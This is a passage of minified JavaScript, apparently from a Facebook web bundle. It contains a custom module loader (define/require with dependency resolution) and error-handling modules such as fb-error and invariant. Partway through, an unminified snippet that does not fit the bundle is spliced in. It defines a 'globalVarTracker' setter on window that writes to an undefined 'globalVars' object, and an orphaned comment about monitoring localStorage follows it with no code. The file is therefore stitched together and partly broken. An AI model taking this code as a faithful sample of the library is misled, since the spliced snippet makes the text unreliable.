  b.objectWithoutPropertiesLoose = function (a, b) {
    var d = {};
    for (var e in a) {
      if (!c.call(a, e) || b.indexOf(e) >= 0) continue;
      d[e] = a[e];
    }
    return d;
  };
  b.taggedTemplateLiteralLoose = function (a, b) {
    b || (b = a.slice(0));
    a.raw = b;
    return a;
  };
  b.bind = Function.prototype.bind;
  b.wrapAsyncGenerator = function (a) {
    return function () {
      return new e(a.apply(this, arguments));
    };
  };
  b.awaitAsyncGenerator = function (a) {
    return new d(a);
  };
  b.asyncIterator = function (a) {
    var b;
    if (typeof Symbol !== "undefined") {
      if (typeof Symbol === "function" ? Symbol.asyncIterator : "@@asyncIterator") {
        b = a[Symbol.asyncIterator];
        if (b != null) return b.call(a);
      }
      if (typeof Symbol === "function" ? Symbol.iterator : "@@iterator") {
        b = a[Symbol.iterator];
        if (b != null) return b.call(a);
      }
    }
    throw new TypeError("Object is not async iterable");
  };
  b.asyncGeneratorDelegate = function (a, b) {
    var c = {},
      d = !1;
    function e(c, e) {
      d = !0;
      e = new Promise(function (b) {
        b(a[c](e));
      });
      return {
        done: !1,
        value: b(e)
      };
    }
    typeof Symbol === "function" && (typeof Symbol === "function" ? Symbol.iterator : "@@iterator") && (c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"] = function () {
      return this;
    });
    c.next = function (a) {
      if (d) {
        d = !1;
        return a;
      }
      return e("next", a);
    };
    typeof a["throw"] === "function" && (c["throw"] = function (a) {
      if (d) {
        d = !1;
        throw a;
      }
      return e("throw", a);
    });
    typeof a["return"] === "function" && (c["return"] = function (a) {
      if (d) {
        d = !1;
        return a;
      }
      return e("return", a);
    });
    return c;
  };
})(typeof global === "undefined" ? self : global);
(function (a) {
  if (a.require != null) return;
  var b = null,
    c = null,
    d = [],
    e = {},
    f = {},
    g = 0,
    h = 0,
    i = 0,
    j = 0,
    k = 0,
    l = 1,
    m = 2,
    n = 4,
    o = 8,
    p = 16,
    aa = 32,
    ba = 64,
    ca = {},
    q = {},
    r = Object.prototype.hasOwnProperty,
    s = Object.prototype.toString;
  function t(a) {
    a = Array.prototype.slice.call(a);
    var b = {},
      c,
      d,
      f,
      g;
    while (a.length) {
      d = a.shift();
      if (b[d]) continue;
      b[d] = !0;
      f = e[d];
      if (!f || U(f)) continue;
      if (f.dependencies) for (c = 0; c < f.dependencies.length; c++) g = f.dependencies[c], U(g) || a.push(g.id);
    }
    for (d in b) r.call(b, d) && a.push(d);
    b = [];
    for (c = 0; c < a.length; c++) {
      d = a[c];
      var h = d;
      f = e[d];
      d = f ? f.dependencies : null;
      if (!f || !d) h += " is not defined";else if (U(f)) h += " is ready";else {
        f = [];
        for (var i = 0; i < d.length; i++) g = d[i], U(g) || f.push(g.id);
        h += " is waiting for " + f.join(", ");
      }
      b.push(h);
    }
    return b.join("\n");
  }
  function u(b) {
    var a = new Error(b);
    a.name = "ModuleError";
    a.messageFormat = b;
    for (var c = arguments.length, d = new Array(c > 1 ? c - 1 : 0), e = 1; e < c; e++) d[e - 1] = arguments[e];
    a.messageParams = d.map(function (a) {
      return String(a);
    });
    a.taalOpcodes = [2, 2];
    return a;
  }
  $ = a.Env || {};
  var v = !!$.gk_require_when_ready_in_order,
    w = !!$.profile_require_factories,
    x = a.performance || {},
    y;
  if (x.now && x.timing && x.timing.navigationStart) {
    var z = x.timing.navigationStart;
    y = function () {
      return x.now() + z;
    };
  } else y = function () {
    return Date.now();
  };
  var A = 0;
  function B(a) {
    A++;
    var b = e[a];
    (!b || b.exports == null && !b.factoryFinished) && (G(a), b = e[a]);
    b && b.refcount-- === 1 && (e[a] = null);
    return b;
  }
  function C(a) {
    return a.defaultExport !== q ? a.defaultExport : a.exports;
  }
  function D(a) {
    a = B(a);
    if (a) return C(a);
  }
  function E(a) {
    a = B(a);
    if (a) return a.defaultExport !== q ? a.defaultExport : null;
  }
  function F(a) {
    a = B(a);
    if (a) return a.exports;
  }
  function da(a) {
    a.factoryLength === -1 && (a.factoryLength = a.factory.length);
    return a.factoryLength;
  }
  function G(d) {
    var g = a.ErrorGuard;
    if (g && !g.inGuard()) return g.applyWithGuard(G, null, [d]);
    g = e[d];
    if (!g) {
      var h = 'Requiring unknown module "%s"';
      throw u(h, d);
    }
    a.__onBeforeModuleFactory == null ? void 0 : a.__onBeforeModuleFactory(g);
    var i, j;
    if (g.hasError) if (g.error == null) throw u('Requiring module "%s" which threw an exception', d);else {
      h = H(g.error);
      I(h, {
        messageFormat: 'Requiring module "%s" which threw an exception',
        messageParams: [d]
      });
      throw h;
    }
    if (!U(g)) throw u('Requiring module "%s" with unresolved dependencies: %s', d, t([d]));
    K(g);
    h = g.exports = {};
    var k = g.factory,
      l = g.dependencies;
    if (s.call(k) === "[object Function]" && l != null) {
      var n = l.length,
        p,
        q;
      try {
        try {
          ua(g);
        } catch (a) {
          J(a, d);
        }
        var v = [],
          x = n;
        if (g.special & o) {
          var z = g.special & aa ? c : b;
          v = z.slice(0);
          v[z.length - 2] = g;
          v[z.length - 1] = h;
          x += v.length;
        }
        if (g.special & m) {
          z = da(g);
          x = Math.min(n + v.length, z);
        }
        for (h = 0; h < n; h++) {
          z = l[h];
          v.length < x && v.push(D.call(null, z.id));
        }
        var A;
        w && (A = y());
        f[g.id].factoryRun = !0;
        try {
          z = g.context != null ? g.context : a;
          p = k.apply(z, v);
        } catch (a) {
          J(a, d);
        } finally {
          if (w) {
            x = y();
            l = f[g.id];
            l.factoryTime = x - (A || 0);
            l.factoryEnd = x;
            l.factoryStart = A;
            if (k.__SMmeta) for (n in k.__SMmeta) Object.prototype.hasOwnProperty.call(k.__SMmeta, n) && (l[n] = k.__SMmeta[n]);
          }
        }
      } catch (a) {
        g.hasError = !0;
        g.error = a;
        g.exports = null;
        throw a;
      } finally {}
      p && (g.exports = p);
      var B;
      g.special & ba ? g.exports != null && r.call(g.exports, "default") && (g.defaultExport = B = g.exports["default"]) : g.defaultExport = B = g.exports;
      if (typeof B === "function") {
        h = B.__superConstructor__;
        if (!B.displayName || h && h.displayName === B.displayName) try {
          B.displayName = (B.name || "(anonymous)") + " [from " + d + "]";
        } catch (a) {}
      }
      g.factoryFinished = !0;
    } else g.exports = k;
    z = "__isRequired__" + d;
    v = e[z];
    v && !U(v) && S(z, ca);
    a.__onAfterModuleFactory == null ? void 0 : a.__onAfterModuleFactory(g);
  }
  function H(b) {
    if (a.getErrorSafe != null) return a.getErrorSafe(b);
    return b != null && typeof b === "object" && typeof b.message === "string" ? b : u("Non-error thrown: %s", String(b));
  }
  function I(b, c) {
    var d = a.ErrorSerializer;
    d && d.aggregateError(b, c);
  }
  function J(a, b) {
    a = H(a);
    I(a, {
      messageFormat: 'Module "%s"',
      messageParams: [b],
      forcedKey: b.startsWith("__") ? null : b
    });
    throw a;
  }
  function ea() {
    return A;
  }
  function fa() {
    var a = {};
    for (var b in f) Object.prototype.hasOwnProperty.call(f, b) && (a[b] = f[b]);
    return a;
  }
  function K(a) {
    if (a.nonJSDeps) return;
    a.nonJSDeps = !0;
    a.dependencies && a.dependencies.forEach(K);
  }
  var L = !!(a != null && a.document != null && "createElement" in a.document),
    M = $.use_fbt_virtual_modules === !0 && L,
    ga = "$fbt_virtual",
    N = {},
    O = null,
    P = 6e4;
  function ha(a, b) {
    !(a in e) && !(a in N) && (N[a] = {
      injectTime: y(),
      hash: b ? b.dataset.bootloaderHash || b.dataset.bootloaderHashClient : null
    }), O || (O = setTimeout(Z()(Q, "_checkFbtVirtualModuleTimeout"), P));
  }
  function Q() {
    O = null;
    M || T.apply(null, [["FBLogger"], function (a) {
      a("binary_transparency", "invalid_vmod_use").mustfix("_checkFbtVirtualModuleTimeout timeout queued when USE_FBT_VIRTUAL_MODULES is false!");
    }]);
    a.__translationFetchTracker == null && (a.__translationFetchTracker = {});
    var b = a.__translationFetchTracker,
      c = y(),
      d = {};
    for (var e in N) {
      var f = N[e],
        g = f.hash;
      f = f.injectTime;
      if (c - f <= P) continue;
      f = g == null || !(g in b) || b[g] === "fetched";
      if (f) {
        f = g != null ? g : "unknown";
        d[f] = d[f] || [];
        d[f].push(e);
        delete N[e];
      } else g != null && b[g] === "failed" && delete N[e];
    }
    Object.keys(N).length > 0 && (O = setTimeout(Z()(Q, "_checkFbtVirtualModuleTimeout"), P));
    Object.keys(d).length > 0 && T.apply(null, [["FBLogger"], function (a) {
      for (var b in d) a("binary_transparency", "vmod_timeout").warn("The following virtual modules in resource %s are taking over %sms to be defined: %s...", b, P, d[b].join(",").slice(0, 300));
    }]);
  }
  var R = ["fbt", "fbs", "errorDesc", "adsErrorDesc", "codedError", "errorSummary"];
  function ia(a, b, c) {
    if (!M) return;
    if (R.indexOf(a) !== -1) return;
    for (var d = 0; d < b.length; d++) if (R.indexOf(b[d]) !== -1) {
      var e = a + ga;
      b.push(e);
      ha(e, c);
      break;
    }
  }
  function S(b, c, e, g, h, i, l, m) {
    c === void 0 ? (c = [], e = b, b = ma()) : e === void 0 && (e = c, s.call(b) === "[object Array]" ? (c = b, b = ma(c.join(","))) : c = []);
    var n = {
        cancel: la.bind(this, b)
      },
      o = ja(b);
    if (!c && !e && i) {
      o.refcount += i;
      return n;
    }
    M && (b in N && delete N[b], Array.isArray(c) && ia(b, c, m));
    f[b] = {
      id: b,
      dependencies: c,
      meta: l,
      category: g,
      defined: w ? y() : null,
      factoryTime: null,
      factoryStart: null,
      factoryEnd: null,
      factoryRun: !1
    };
    if (o.dependencies && o.reload !== !0) {
      b.indexOf(":") != -1 ? k++ : j++;
      return n;
    }
    i && (o.refcount += i);
    m = c.map(ja);
    o.factory = e;
    o.dependencies = m;
    o.context = h;
    o.special = g;
    (o.nonJSDeps || ta(o)) && (o.nonJSDeps = !1, K(o));
    V(o);
    if (d.length > 0) {
      var p = d;
      d = [];
      l = a.ScheduleJSWork ? a.ScheduleJSWork : xa;
      l(function () {
        if (v) {
          for (var a = 0; a < p.length; a++) D.call(null, p[a].id);
          p.length = 0;
        } else while (p.length > 0) D.call(null, p.pop().id);
      })();
    }
    return n;
  }
  function ja(a) {
    var b = e[a];
    if (b) return b;
    b = new ka(a, 0);
    e[a] = b;
    return b;
  }
  function ka(a, b, c) {
    this.id = a, this.refcount = b, this.exports = c || null, this.defaultExport = c || q, this.factory = void 0, this.factoryLength = -1, this.factoryFinished = !1, this.dependencies = void 0, this.depPosition = 0, this.context = void 0, this.special = 0, this.hasError = !1, this.error = null, this.ranRecursiveSideEffects = !1, this.sideEffectDependencyException = null, this.nextDepWaitingHead = null, this.nextDepWaitingNext = null, this.tarjanGeneration = -1, this.tarjanLow = 0, this.tarjanIndex = 0, this.tarjanOnStack = !1, this.nonJSDeps = !1;
  }
  function la(a) {
    if (!e[a]) return;
    var b = e[a];
    e[a] = null;
    if (b.dependencies) for (a = 0; a < b.dependencies.length; a++) {
      var c = b.dependencies[a];
      c.refcount-- === 1 && la(c.id);
    }
  }
  function T(a, b, c) {
    var d = "__requireLazy__x__" + g++;
    return S("__requireLazy__" + d, a, Z()(b, "requireLazy", {
      propagationType: 0
    }), l | p, c, 1);
  }
  function ma(a) {
    return "__mod__" + (a != null ? a + "__" : "") + g++;
  }
  function na(a, b, c) {
    c.tarjanGeneration != h && (c.tarjanGeneration = h, c.tarjanLow = c.tarjanIndex = i++, c.tarjanOnStack = !0, b.push(c));
    if (c.dependencies != null) for (var d = c.depPosition; d < c.dependencies.length; d++) {
      var e = c.dependencies[d];
      e.tarjanGeneration != h ? (na(a, b, e), c.tarjanLow = Math.min(c.tarjanLow, e.tarjanLow)) : e.tarjanOnStack && (c.tarjanLow = Math.min(c.tarjanLow, e.tarjanIndex));
    }
    if (c.tarjanLow == c.tarjanIndex) {
      e = [];
      do {
        d = b.pop();
        d.tarjanOnStack = !1;
        e.push(d);
        if (c == b[0] && d != c && d.dependencies != null) for (var f = d.depPosition; f < d.dependencies.length; f++) {
          var g = d.dependencies[f];
          !U(g) && a.indexOf(g) == -1 && b.indexOf(g) == -1 && e.indexOf(g) == -1 && a.push(g);
        }
      } while (d != c);
    }
  }
  function oa(a) {
    var b = a.dependencies;
    if (!b) throw u("Called _replaceCycleLinkWithSCCDeps on an undefined module");
    h++;
    na(b, [], a);
    a.depPosition++;
    V(a);
  }
  function pa(a, b) {
    var c = b;
    while (!0) {
      if (c.dependencies && c.depPosition != c.dependencies.length) c = c.dependencies[c.depPosition];else break;
      if (c == a) {
        oa(a);
        return;
      }
    }
    a.nextDepWaitingNext = b.nextDepWaitingHead;
    b.nextDepWaitingHead = a;
  }
  function U(a) {
    return a.dependencies != null && a.depPosition >= a.dependencies.length;
  }
  function qa(a) {
    a.depPosition++, V(a);
  }
  function ra(a) {
    var b = a.nextDepWaitingHead;
    a.nextDepWaitingHead = null;
    while (b != null) {
      var c = b;
      c.nonJSDeps && K(a);
      b = c.nextDepWaitingNext;
      c.nextDepWaitingNext = null;
      var d = !e[c.id];
      d || qa(c);
    }
  }
  function sa(a) {
    return a.special & l;
  }
  function ta(a) {
    return a.special & p;
  }
  function V(a) {
    while (a.dependencies != null && a.depPosition < a.dependencies.length) {
      var b = a.dependencies[a.depPosition],
        c = U(b);
      if (!c && a != b) {
        pa(a, b);
        return;
      }
      a.depPosition++;
    }
    sa(a) && d.push(a);
    a.nextDepWaitingHead !== null && ra(a);
  }
  function ua(a) {
    if (a.sideEffectDependencyException != null) throw a.sideEffectDependencyException;
    if (a.ranRecursiveSideEffects) return;
    a.ranRecursiveSideEffects = !0;
    var b = a.dependencies;
    if (b) for (var c = 0; c < b.length; c++) {
      var d = b[c];
      try {
        ua(d);
      } catch (b) {
        a.sideEffectDependencyException = b;
        throw b;
      }
      if (d.special & n) try {
        D.call(null, d.id);
      } catch (b) {
        a.sideEffectDependencyException = b;
        throw b;
      }
    }
  }
  function W(a, b) {
    e[a] = new ka(a, 0, b), f[a] = {
      id: a,
      dependencies: [],
      category: 0,
      factoryLengthAccessTime: null,
      factoryTime: null,
      factoryStart: null,
      factoryEnd: null,
      factoryRun: !1
    };
  }
  W("module", 0);
  W("exports", 0);
  W("define", S);
  W("global", a);
  W("require", D);
  W("requireInterop", D);
  W("importDefault", E);
  W("importNamespace", F);
  W("requireDynamic", va);
  W("requireLazy", T);
  W("requireWeak", X);
  W("ifRequired", wa);
  W("ifRequireable", Y);
  b = [D.call(null, "global"), D.call(null, "require"), D.call(null, "requireDynamic"), D.call(null, "requireLazy"), D.call(null, "requireInterop"), null];
  c = [D.call(null, "global"), D.call(null, "require"), D.call(null, "importDefault"), D.call(null, "importNamespace"), D.call(null, "requireLazy"), D.call(null, "requireInterop"), null];
  S.amd = {};
  a.define = S;
  a.require = D;
  a.requireInterop = D;
  a.importDefault = E;
  a.importNamespace = F;
  a.requireDynamic = va;
  a.requireLazy = T;
  a.__onBeforeModuleFactory = null;
  a.__onAfterModuleFactory = null;
  function va(a, b) {
    throw new ReferenceError("requireDynamic is not defined");
  }
  function X(a, b) {
    wa.call(null, a, function (a) {
      b(a);
    }, function () {
      S("__requireWeak__" + a + "__" + g++, ["__isRequired__" + a], Z()(function () {
        return b(C(e[a]));
      }, "requireWeak"), l, null, 1);
    });
  }
  function wa(a, b, c) {
    a = e[a];
    if (a && a.factoryFinished) {
      if (typeof b === "function") return b(C(a));
    } else if (typeof c === "function") return c();
  }
  function Y(a, b, c) {
    var d = e[a];
    if (d && d.nonJSDeps && U(d)) {
      if (typeof b === "function") return b(D.call(null, a));
    } else if (typeof c === "function") return c();
  }
  $ = {
    getDupCount: function () {
      return [j, k];
    },
    getModules: function () {
      var a = {};
      for (var b in e) e[b] && Object.prototype.hasOwnProperty.call(e, b) && (a[b] = e[b]);
      return a;
    },
    modulesMap: e,
    debugUnresolvedDependencies: t
  };
  function xa(a) {
    return a;
  }
  function Z() {
    var b = a.TimeSlice && a.TimeSlice.guard ? a.TimeSlice.guard : xa;
    return function () {
      return b.apply(void 0, arguments);
    };
  }
  W("__getTotalRequireCalls", ea);
  W("__getModuleTimeDetails", fa);
  W("__debug", $);
  a.__d = function (a, b, c, d, e) {
    Z()(function () {
      S(a, b, c, (d || m) | o, null, null, null, e);
    }, "define " + a, {
      root: !0
    })();
  };
  function $(a, b) {
    return !0;
  }
  if (a.__d_stub) {
    for (L = 0; L < a.__d_stub.length; L++) a.__d.apply(null, a.__d_stub[L]);
    delete a.__d_stub;
  }
  if (a.__rl_stub) {
    for (X = 0; X < a.__rl_stub.length; X++) T.apply(null, a.__rl_stub[X]);
    delete a.__rl_stub;
  }
  Y = function () {};
  a.$RefreshReg$ = Y;
  a.$RefreshSig$ = function () {
    return function (a) {
      return a;
    };
  };
})(typeof this !== "undefined" ? this : typeof global !== "undefined" ? global : typeof window !== "undefined" ? window : typeof self !== "undefined" ? self : {});
(function (a) {
  var b = a.performance;
  b && b.setResourceTimingBufferSize && (b.setResourceTimingBufferSize(1e5), b.onresourcetimingbufferfull = function () {
    a.__isresourcetimingbufferfull = !0;
  }, b.setResourceTimingBufferSize = function () {});
})(typeof this === "object" ? this : typeof global === "object" ? global : typeof window === "object" ? window : typeof self === "object" ? self : {});
__d("fb-error-lite", [], function (a, b, c, d, e, f) {
  "use strict";

  var g = {
    PREVIOUS_FILE: 1,
    PREVIOUS_FRAME: 2,
    PREVIOUS_DIR: 3,
    FORCED_KEY: 4
  };
  function a(a) {
    var b = new Error(a);
    if (b.stack === void 0) try {
      throw b;
    } catch (a) {}
    b.messageFormat = a;
    for (var c = arguments.length, d = new Array(c > 1 ? c - 1 : 0), e = 1; e < c; e++) d[e - 1] = arguments[e];
    b.messageParams = d.map(function (a) {
      return String(a);
    });
    b.taalOpcodes = [g.PREVIOUS_FRAME];
    return b;
  }
  b = {
    err: a,
    TAALOpcode: g
  };
  f["default"] = b;
}, 66);
__d("$-core", ["fb-error-lite"], function (a, b, c, d, e, f, g) {
  function a(a) {
    return h(a, typeof a === "string" ? document.getElementById(a) : a);
  }
  function b(a) {
    return h(a, typeof a === "string" ? document.getElementById(a) : a);
  }
  function h(a, b) {
    if (!b) {
      a = c("fb-error-lite").err('Tried to get element with id of "%s" but it is not present on the page', String(a));
      a.taalOpcodes = a.taalOpcodes || [];
      a.taalOpcodes = [c("fb-error-lite").TAALOpcode.PREVIOUS_FILE];
      throw a;
    }
    return b;
  }
  a.fromIDOrElement = b;
  g["default"] = a;
}, 98);
__d("$", ["$-core"], function (a, b, c, d, e, f, g) {
  g["default"] = c("$-core");
}, 98);
__d("Env", [], function (a, b, c, d, e, f) {
  b = {
    ajaxpipe_token: null,
    compat_iframe_token: null,
    iframeKey: "",
    iframeTarget: "",
    iframeToken: "",
    isCQuick: !1,
    jssp_header_sent: !1,
    jssp_targeting_enabled: !1,
    start: Date.now(),
    nocatch: !1,
    useTrustedTypes: !1,
    isTrustedTypesReportOnly: !1,
    enableDefaultTrustedTypesPolicy: !1,
    ig_server_override: "",
    barcelona_server_override: "",
    ig_mqtt_wss_endpoint: "",
    ig_mqtt_polling_endpoint: ""
  };
  a.Env && Object.assign(b, a.Env);
  a.Env = b;
  c = b;
  f["default"] = c;
}, 66);
__d("sprintf", [], function (a, b, c, d, e, f) {
  function a(a) {
    for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
    var e = 0;
    return a.replace(/%s/g, function () {
      return String(c[e++]);
    });
  }
  f["default"] = a;
}, 66);
__d("invariant", ["Env", "fb-error-lite", "sprintf"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a, b) {
    if (!a) {
      var d = b;
      for (var e = arguments.length, f = new Array(e > 2 ? e - 2 : 0), g = 2; g < e; g++) f[g - 2] = arguments[g];
      if (typeof d === "number") {
        var i = h(d, f),
          j = i.message,
          k = i.decoderLink;
        d = j;
        f.unshift(k);
      } else if (d === void 0) {
        d = "Invariant: ";
        for (var l = 0; l < f.length; l++) d += "%s,";
      }
      var m = d,
        n = new Error(m);
      n.name = "Invariant Violation";
      n.messageFormat = d;
      n.messageParams = f.map(function (a) {
        return String(a);
      });
      n.taalOpcodes = [c("fb-error-lite").TAALOpcode.PREVIOUS_FRAME];
      n.stack;
      throw n;
    }
  }
  function h(a, b) {
    var d = "Minified invariant #" + a + "; %s";
    b.length > 0 && (d += " Params: " + b.map(function (a) {
      return "%s";
    }).join(", "));
    a = c("Env").show_invariant_decoder === !0 ? "visit " + i(a, b) + " to see the full message." : "";
    return {
      message: d,
      decoderLink: a
    };
  }
  function i(a, b) {
    a = "https://www.internalfb.com/intern/invariant/" + a + "/";
    b.length > 0 && (a += "?" + b.map(function (a, b) {
      return "args[" + b + "]=" + encodeURIComponent(String(a));
    }).join("&"));
    return a;
  }
  g["default"] = a;
}, 98);
Object.defineProperty(window, 'globalVarTracker', {
  set: val => {
    console.log('New global variable created: ' + val);
    globalVars[val] = window[val];
  }
});

// Monitors localStorage set items

__d("ArbiterToken", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  a = function () {
    function a(a, b) {
      this.unsubscribe = function () {
        for (var a = 0; a < this.$2.length; a++) this.$2[a].remove();
        this.$2.length = 0;
      }, this.$1 = a, this.$2 = b;
    }
    var b = a.prototype;
    b.isForArbiterInstance = function (a) {
      this.$1 || h(0, 2506);
      return this.$1 === a;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("performance", [], function (a, b, c, d, e, f) {
  "use strict";

  b = a.performance || a.msPerformance || a.webkitPerformance || {};
  c = b;
  f["default"] = c;
}, 66);
__d("performanceNow", ["performance"], function (a, b, c, d, e, f, g) {
  if (c("performance").now) b = function () {
    return c("performance").now();
  };else {
    d = a._cstart;
    e = Date.now();
    var h = typeof d === "number" && d < e ? d : e,
      i = 0;
    b = function () {
      var a = Date.now(),
        b = a - h;
      b < i && (h -= i - b, b = a - h);
      i = b;
      return b;
    };
  }
  f = b;
  g["default"] = f;
}, 98);
__d("performanceNowSinceAppStart", ["performanceNow"], function (a, b, c, d, e, f, g) {
  g["default"] = c("performanceNow");
}, 98);
__d("removeFromArray", [], function (a, b, c, d, e, f) {
  function a(a, b) {
    b = a.indexOf(b);
    b !== -1 && a.splice(b, 1);
  }
  f["default"] = a;
}, 66);
__d("fb-error", ["performanceNowSinceAppStart", "removeFromArray"], function (a, b, c, d, e, f) {
  "use strict";

  var g = {
    PREVIOUS_FILE: 1,
    PREVIOUS_FRAME: 2,
    PREVIOUS_DIR: 3,
    FORCED_KEY: 4
  };
  function h(b) {
    var a = new Error(b);
    if (a.stack === void 0) try {
      throw a;
    } catch (a) {}
    a.messageFormat = b;
    for (var c = arguments.length, d = new Array(c > 1 ? c - 1 : 0), e = 1; e < c; e++) d[e - 1] = arguments[e];
    a.messageParams = d.map(function (a) {
      return String(a);
    });
    a.taalOpcodes = [g.PREVIOUS_FRAME];
    return a;
  }
  var i = !1,
    j = {
      errorListener: function (b) {
        var c = a.console,
          d = c[b.type] ? b.type : "error";
        if (b.type === "fatal" || d === "error" && !i) {
          d = b.message;
          c.error("ErrorUtils caught an error:\n\n" + d + "\n\nSubsequent non-fatal errors won't be logged; see https://fburl.com/debugjs.");
          i = !0;
        }
      }
    },
    k = {
      access_token: null
    },
    l = 6,
    m = 6e4,
    n = 10 * m,
    o = new Map(),
    p = 0;
  function q() {
    var a = b("performanceNowSinceAppStart")();
    if (a > p + m) {
      var c = a - n;
      for (var d = o, e = Array.isArray(d), f = 0, d = e ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var g;
        if (e) {
          if (f >= d.length) break;
          g = d[f++];
        } else {
          f = d.next();
          if (f.done) break;
          g = f.value;
        }
        g = g;
        var h = g[0];
        g = g[1];
        g.lastAccessed < c && o["delete"](h);
      }
      p = a;
    }
  }
  function r(a) {
    q();
    var c = b("performanceNowSinceAppStart")(),
      d = o.get(a);
    if (d == null) {
      o.set(a, {
        dropped: 0,
        logged: [c],
        lastAccessed: c
      });
      return 1;
    }
    a = d.dropped;
    var e = d.logged;
    d.lastAccessed = c;
    while (e[0] < c - m) e.shift();
    if (e.length < l) {
      d.dropped = 0;
      e.push(c);
      return a + 1;
    } else {
      d.dropped++;
      return null;
    }
  }
  var s = {
      shouldLog: function (a) {
        return r(a.hash);
      }
    },
    t = "RE_EXN_ID";
  function u(a) {
    var b = null;
    a == null || typeof a !== "object" ? b = h("Non-object thrown: %s", String(a)) : Object.prototype.hasOwnProperty.call(a, t) ? b = h("Rescript exception thrown: %s", JSON.stringify(a)) : typeof (a === null || a === void 0 ? void 0 : a.then) === "function" ? b = h("Promise thrown: %s", JSON.stringify(a)) : typeof a.message !== "string" ? b = h("Non-error thrown: %s, keys: %s", String(a), JSON.stringify(Object.keys(a).sort())) : a.messageFormat != null && typeof a.messageFormat !== "string" ? b = h("Error with non-string messageFormat thrown: %s, %s, keys: %s", String(a.message), String(a), JSON.stringify(Object.keys(a).sort())) : Object.isExtensible && !Object.isExtensible(a) && (b = h("Non-extensible thrown: %s", String(a.message)));
    if (b != null) {
      b.taalOpcodes = b.taalOpcodes || [];
      b.taalOpcodes.push(g.PREVIOUS_FRAME);
      return b;
    }
    return a;
  }
  var aa = typeof window === "undefined" ? "<self.onerror>" : "<window.onerror>",
    v;
  function ba(a) {
    var b = a.error != null ? u(a.error) : h(a.message || "");
    b.fileName == null && a.filename != null && (b.fileName = a.filename);
    b.line == null && a.lineno != null && (b.line = a.lineno);
    b.column == null && a.colno != null && (b.column = a.colno);
    b.guardList = [aa];
    b.loggingSource = "ONERROR";
    (a = v) === null || a === void 0 ? void 0 : a.reportError(b);
  }
  var w = {
      setup: function (b) {
        if (typeof a.addEventListener !== "function") return;
        if (v != null) return;
        v = b;
        a.addEventListener("error", ba);
      }
    },
    x = [],
    y = {
      pushGuard: function (a) {
        x.unshift(a);
      },
      popGuard: function () {
        x.shift();
      },
      inGuard: function () {
        return x.length !== 0;
      },
      cloneGuardList: function () {
        return x.map(function (a) {
          return a.name;
        });
      },
      findDeferredSource: function () {
        for (var a = 0; a < x.length; a++) {
          var b = x[a];
          if (b.deferredSource != null) return b.deferredSource;
        }
      }
    };
  function ca(a) {
    if (a.type != null) return a.type;
    if (a.loggingSource == "GUARDED" || a.loggingSource == "ERROR_BOUNDARY") return "fatal";
    if (a.name == "SyntaxError") return "fatal";
    if (a.loggingSource == "ONERROR" && a.message.indexOf("ResizeObserver loop") >= 0) return "warn";
    return a.stack != null && a.stack.indexOf("chrome-extension://") >= 0 ? "warn" : "error";
  }
  var z = [],
    A = function () {
      function a() {
        this.metadata = [].concat(z);
      }
      var b = a.prototype;
      b.addEntries = function () {
        var a;
        (a = this.metadata).push.apply(a, arguments);
        return this;
      };
      b.addEntry = function (a, b, c) {
        this.metadata.push([a, b, c]);
        return this;
      };
      b.isEmpty = function () {
        return this.metadata.length === 0;
      };
      b.clearEntries = function () {
        this.metadata = [];
      };
      b.format = function () {
        var a = [];
        this.metadata.forEach(function (b) {
          if (b && b.length) {
            b = b.map(function (a) {
              return a != null ? String(a).replace(/:/g, "_") : "";
            }).join(":");
            a.push(b);
          }
        });
        return a;
      };
      b.getAll = function () {
        return this.metadata;
      };
      a.addGlobalMetadata = function (a, b, c) {
        z.push([a, b, c]);
      };
      a.getGlobalMetadata = function () {
        return z;
      };
      a.unsetGlobalMetadata = function (a, b) {
        z = z.filter(function (c) {
          return !(Array.isArray(c) && c[0] === a && c[1] === b);
        });
      };
      return a;
    }(),
    B = {
      debug: 1,
      info: 2,
      warn: 3,
      error: 4,
      fatal: 5
    };
  function c(a, b) {
    if (Object.isFrozen(a)) return;
    b.type && (!a.type || B[a.type] > B[b.type]) && (a.type = b.type);
    var c = b.metadata;
    if (c != null) {
      var d;
      d = (d = a.metadata) !== null && d !== void 0 ? d : new A();
      c != null && d.addEntries.apply(d, c.getAll());
      a.metadata = d;
    }
    b.project != null && (a.project = b.project);
    b.errorName != null && (a.errorName = b.errorName);
    b.componentStack != null && (a.componentStack = b.componentStack);
    b.deferredSource != null && (a.deferredSource = b.deferredSource);
    b.blameModule != null && (a.blameModule = b.blameModule);
    b.loggingSource != null && (a.loggingSource = b.loggingSource);
    d = (c = a.messageFormat) !== null && c !== void 0 ? c : a.message;
    c = (c = a.messageParams) !== null && c !== void 0 ? c : [];
    if (d !== b.messageFormat && b.messageFormat != null) {
      var e;
      d += " [Caught in: " + b.messageFormat + "]";
      c.push.apply(c, (e = b.messageParams) !== null && e !== void 0 ? e : []);
    }
    a.messageFormat = d;
    a.messageParams = c;
    e = b.forcedKey;
    d = a.forcedKey;
    c = e != null && d != null ? e + "_" + d : e !== null && e !== void 0 ? e : d;
    a.forcedKey = c;
  }
  function d(a) {
    var b;
    return da((b = a.messageFormat) !== null && b !== void 0 ? b : a.message, a.messageParams || []);
  }
  function da(a, b) {
    var c = 0;
    a = String(a);
    a = a.replace(/%s/g, function () {
      return c < b.length ? b[c++] : "NOPARAM";
    });
    c < b.length && (a += " PARAMS" + JSON.stringify(b.slice(c)));
    return a;
  }
  function f(a) {
    return (a !== null && a !== void 0 ? a : []).map(function (a) {
      return String(a);
    });
  }
  var C = {
      aggregateError: c,
      toReadableMessage: d,
      toStringParams: f
    },
    ea = 5,
    D = [];
  function E(a) {
    D.push(a), D.length > ea && D.shift();
  }
  function F(a) {
    var b = a.getAllResponseHeaders();
    if (b != null && b.indexOf("X-FB-Debug") >= 0) {
      b = a.getResponseHeader("X-FB-Debug");
      b && E(b);
    }
  }
  function fa() {
    return D;
  }
  var G = {
      add: E,
      addFromXHR: F,
      getAll: fa
    },
    ga = "abcdefghijklmnopqrstuvwxyz012345";
  function H() {
    var a = 0;
    for (var b = arguments.length, c = new Array(b), d = 0; d < b; d++) c[d] = arguments[d];
    for (var e = 0; e < c.length; e++) {
      var f = c[e];
      if (f != null) {
        var g = f.length;
